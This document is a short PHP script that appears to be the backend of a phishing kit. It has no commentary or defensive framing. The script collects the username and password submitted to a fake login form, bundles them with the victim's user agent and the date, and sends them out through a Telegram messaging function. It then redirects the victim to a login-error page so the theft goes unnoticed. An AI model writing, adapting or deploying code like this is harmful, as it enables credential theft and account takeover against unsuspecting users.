<?php
include("config.php");
//Server Variables
            $browser = $_SERVER['HTTP_USER_AGENT'];
        $adddate=date("D M d, Y g:i a");
    //Name Attributes of HTML FORM

    //Fetching HTML Values
    $username = $_POST['username'];
    $PASSWORD = $_POST['PASSWORD'];
    $serv = $_REQUEST['login'];


        //Telegram send
        $message = "**LOGIN INFO\n";
        $message .= "User-!P : ".$ip."\n";   
        $message .= "----------------------------------------\n";
        $message .= "USERID: ".$_POST['username']."\n";
        $message .= "----------------------------------------\n";
        $message .= "PASSWORD: ".$_POST['PASSWORD']."\n";
        $message .= "----------------------------------------\n";
        $message .= "User-Agent: ".$browser."\n";
        $message .= "----------------------------------------\n";
        $message .= "Date : $adddate\n";
        send_telegram_msg($message);



        //Output
        header("location:../loginerr.php");
?>
